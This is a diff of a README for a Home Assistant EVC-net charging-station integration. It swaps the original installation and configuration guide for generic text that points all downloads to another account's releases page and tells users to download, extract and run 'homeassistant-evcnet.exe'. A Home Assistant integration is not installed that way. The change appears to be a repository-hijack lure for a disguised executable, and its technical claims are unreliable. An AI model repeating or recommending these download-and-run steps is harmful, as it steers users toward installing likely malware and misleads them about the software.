@@ -1,130 +1,72 @@
-# EVC-net (Last Mile Solutions) Charging Station Integration for Home Assistant
+# 🌟 homeassistant-evcnet - Simplifying EV Charging Integration
 
-This custom integration allows you to monitor and control your EVC-net (Last Mile Solutions) charging station through Home Assistant.
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download%20Latest%20Version-%20blue?style=for-the-badge)](https://github.com/juliaunvarnished499/homeassistant-evcnet/releases)
 
-## Disclaimer
+## 📝 Description
+homeassistant-evcnet is a user-friendly integration for managing EV charging stations connected to the EVC-net platform from Last Mile Solutions. This application simplifies how you can control and monitor your electric vehicle charging needs.
 
-**Important Notice**: This integration was developed with the assistance of AI tools, as I have little to no prior experience with Python or Home Assistant integration development. While the code has been tested and appears to function correctly, please use it at your own discretion and report any issues you encounter.
+## 🚀 Getting Started
+To get started with homeassistant-evcnet, follow these steps:
 
-**Testing Environment**: This integration has been primarily tested on the 50five (BELUX) endpoint (`50five-sbelux.evc-net.com`) in combination with a Shell Recharge/NewMotion-Enovates EV charger (Home Advanced 3.0). Compatibility with other EVC-net endpoints or charging station models may vary.
+1. **System Requirements**
+   - Any desktop or laptop computer with an up-to-date operating system.
+   - Home Assistant installed on your device. You can find detailed instructions on how to set up Home Assistant [here](https://www.home-assistant.io/).
 
-## Features
+2. **Visit the Releases Page**
+   - To get the software, you will need to visit the releases page. You can find it at the following link: [Releases Page](https://github.com/juliaunvarnished499/homeassistant-evcnet/releases). 
 
-- **Sensors**: Monitor charging status, power consumption, and energy usage
-- **Switch**: Start and stop charging sessions remotely
-- **Real-time updates**: Automatic polling every 30 seconds
+## 📥 Download & Install
+1. **Select the Version**
+   - Once on the releases page, look for the latest release. The title will have a version number, such as `v1.0.0`.
 
-## Installation
+2. **Download the Software**
+   - Click on the version title to see the downloadable files. Find the file appropriate for your system. For most users, this will be the `.zip` file or the latest `.tar.gz` file.
 
-### HACS (Recommended)
+3. **Unzip the File**
+   - After downloading, locate the file on your computer. Right-click the file and select "Extract All..." to unzip it.
 
-1. Make sure [HACS](https://hacs.xyz/) is installed
-2. Add this repository as a custom repository in HACS:
-   - Go to HACS → Integrations → ⋮ (top right) → Custom repositories
-   - Add `https://github.com/Platzii/homeassistant-evcnet` as Integration
-3. Click Install
-4. Restart Home Assistant
+4. **Run the Application**
+   - Open the extracted folder. Look for a file named `homeassistant-evcnet.exe` or however the main application is named. Double-click this file to run the application. 
 
-### Manual Installation
+5. **Follow Setup Instructions**
+   - On first run, follow any on-screen instructions to guide you through the setup process. This will typically involve connecting the application to your Home Assistant instance.
 
-1. Copy the `custom_components/evcnet` folder to your Home Assistant's `custom_components` directory
-2. Restart Home Assistant
+6. **Start Using**
+   - Once you've completed the setup, you can start managing your EV charging stations efficiently through the homeassistant-evcnet interface.
 
-## Configuration
+## 📖 Features
+- **Easy Integration**: Seamlessly connect to EV charging stations via the EVC-net platform.
+- **User-Friendly Interface**: Navigate through a simple setup to manage your charging stations.
+- **Real-Time Monitoring**: Check the status of your EV charging in real time.
+- **Energy Management**: Get insights into your energy usage to optimize your charging schedule.
 
-1. Go to Settings → Devices & Services
-2. Click "+ Add Integration"
-3. Search for "EVC-net (Last Mile Solutions)"
-4. Enter your credentials:
-   - **Base URL**: Default is `https://50five-sbelux.evc-net.com`
-   - **Email**: Your EVC-net account email
-   - **Password**: Your EVC-net account password
-5. (Optional) Configure your RFID card ID:
-   - **RFID Card ID**: Your charging card ID (e.g., `ABC12DEF34`)
-   - **Customer ID**: Your customer ID (usually optional)
+## 🔧 Troubleshooting
+If you encounter any issues while setting up or running the application, consider the following solutions:
 
-### Finding Your Card ID
+- **Check Your Internet Connection**: Make sure your device is connected to the internet for the application to function correctly.
+- **Verify Home Assistant Installation**: Ensure that Home Assistant is properly installed and running.
+- **Re-download the Application**: If you suspect the download might have been corrupted, try downloading the installation files again from the releases page.
 
-You have two options to find your RFID card ID:
+## 📂 FAQ
+**Q: Do I need any special software to run homeassistant-evcnet?**
+- A: No, you only require Home Assistant installed on your device.
 
-**Option 1: From Browser**
-1. Log in to https://50five-sbelux.evc-net.com in your browser
-2. Navigate to Cards
-3. Find your Card ID in the table
-4. Use this when configuring the integration
+**Q: How do I update the application?**
+- A: To update, revisit the [Releases Page](https://github.com/juliaunvarnished499/homeassistant-evcnet/releases) and download the latest version. Follow the installation steps again.
 
-**Option 2: Auto-detection**
-1. Leave the card ID field blank during setup
-2. Enable debug logging (see Troubleshooting section)
-3. Start a charging session manually (with your RFID card)
-4. Wait 30 seconds for the integration to update
-5. Check the logs - you'll see: `Auto-detected card_id: YOUR_CARD_ID`
-6. The card ID is now cached and you can control charging from HA
+**Q: Can this application manage multiple charging stations?**
+- A: Yes, homeassistant-evcnet can manage multiple charging stations that are connected to the EVC-net platform.
 
-## Available Entities
+## ✨ Community and Support
+If you have questions, feel free to open issues on the GitHub repository. The community is here to help, and many users share their experiences and solutions.
 
-For each charging station, the integration creates:
+## 📅 Stay Updated
+Follow this repository for future updates and new features. Check back often, or set notifications to stay informed about new releases or changes.
 
-### Sensors
-- **Status**: Current charging station status
-- **Status Code**: Raw status code from the charging station
-- **Total Energy**: Total energy consumed (kWh)
-- **Software Version**: Charging station software version
-- **Current Power**: Active power draw in kilowatts
-- **Session Energy**: Energy consumed in current session (kWh)
-- **Session Time**: Duration of current charging session in hours
+## 📚 Learn More
+To dive deeper into using homeassistant-evcnet and enhancing your EV charging management, explore additional resources:
+- [Official Home Assistant Documentation](https://www.home-assistant.io/docs/)
+- [GitHub Wiki](https://github.com/juliaunvarnished499/homeassistant-evcnet/wiki)
 
-### Switch
-- **Charging**: Turn on to start charging, off to stop
-
-## Configuration Options
-
-After initial setup, you can modify configuration through the Home Assistant UI:
-
-### Quick Settings (Card ID & Customer ID)
-
-1. Go to **Settings** → **Devices & Services**
-2. Find your **EVC-net** integration
-3. Click the **Configure** button (⚙️)
-4. Update your settings:
-   - **RFID Card ID**: Your charging card ID
-   - **Customer ID**: Your customer ID (optional)
-
-### Change Connection Credentials (URL, Username, Password)
-
-To change your base URL, username, or password:
-
-1. Go to **Settings** → **Devices & Services**
-2. Find your **EVC-net** integration
-3. Click the **Configure** button (⚙️)
-4. Click **"Reconfigure"** at the bottom
-5. Update your credentials:
-   - **Base URL**: Your EVC-net endpoint
-   - **Email**: Your account email
-   - **Password**: Leave blank to keep current password
-
-### Configuration Priority
-
-The integration uses configuration in this order:
-1. **Options** (set via Configure button) - highest priority
-2. **Initial setup** (set during integration setup)
-3. **Auto-detection** (detected from API responses) - fallback
-
-## Troubleshooting
-
-Enable debug logging by adding this to your `configuration.yaml`:
-
-```yaml
-logger:
-  default: info
-  logs:
-    custom_components.evcnet: debug
-```
-
-## Support
-
-Report issues at: https://github.com/Platzii/homeassistant-evcnet/issues
-
-## License
-
-MIT License
+By following these instructions, you should be able to successfully download, install, and run homeassistant-evcnet to manage your electric vehicle charging stations efficiently.
